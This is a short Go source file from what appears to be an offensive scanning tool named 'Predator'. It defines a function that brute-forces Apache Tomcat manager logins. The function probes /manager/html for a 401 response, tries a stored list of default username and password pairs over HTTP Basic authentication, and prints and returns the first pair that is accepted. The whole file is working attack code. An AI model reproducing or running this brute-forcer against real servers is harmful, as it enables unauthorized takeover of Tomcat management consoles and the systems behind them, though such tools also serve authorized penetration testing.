package brute

import (
	"Predator/pkg/utils"
	"fmt"
)

func Tomcat_brute(url string) (username string, password string) {
	if req, err := utils.HttpRequsetBasic("asdasdascsacacs", "asdasdascsacacs", url+"/manager/html", "HEAD", "", false, nil); err == nil {
		if req.StatusCode == 401 {
			for uspa := range tomcatuserpass {
				if req2, err2 := utils.HttpRequsetBasic(tomcatuserpass[uspa].username, tomcatuserpass[uspa].password, url+"/manager/html", "HEAD", "", false, nil); err2 == nil {
					if req2.StatusCode == 200 || req2.StatusCode == 403 {
						fmt.Printf(tomcatuserpass[uspa].username + ":" + tomcatuserpass[uspa].password)
						return tomcatuserpass[uspa].username, tomcatuserpass[uspa].password
					}
				}
			}
		}
	}
	return "", ""
}
